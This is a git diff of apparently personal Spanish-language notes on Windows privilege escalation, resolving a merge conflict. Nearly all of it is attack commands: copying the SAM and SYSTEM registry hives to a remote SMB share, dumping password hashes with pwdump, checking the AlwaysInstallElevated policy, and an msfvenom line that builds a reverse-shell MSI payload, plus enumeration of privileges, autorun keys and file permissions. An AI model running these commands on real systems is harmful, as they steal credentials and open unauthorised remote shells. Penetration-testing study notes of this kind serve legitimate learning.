@@ -40,22 +40,27 @@ reg save HKLM\SYSTEM system.backup
 -
 copy sam.backup \\IP\smbfolder\sam
 copy system.backup \\IP\smbfolder\system
-<<<<<<< HEAD
 -
-pwdump system sam
+pwdump system sam --> lista los hashes de las contraseñas
+
+----
+# AlwaysInstallElevated exploit
+# consultar el estado 
+reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+
+# payload
+msfvenom -p windows/shell/reverse_tcp LHOST=ip LPORT=port -f msi -o payload.msi
+-
 
 # CMD
 tasklist
 taskkill /pid 1234
 taskkill /F /IM notepad.exe
-systeminfo
-
-=======
-pwdump system sam
-
-# comandos
 whoami /priv
 Start-Process "shell.exe"
 systeminfo
 net localgroup Administrators --> lista los miembros del grupo Administrators
->>>>>>> cb59de22e3ba1c8e35002a1a078dcb7ee8b547a3
+reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run --> consulta los programas en autorun
+icacls.exe c:\\windows\system32\SecurityHealthSystray.exe --> muestra los permisos de ejecución de un ejecutable
+
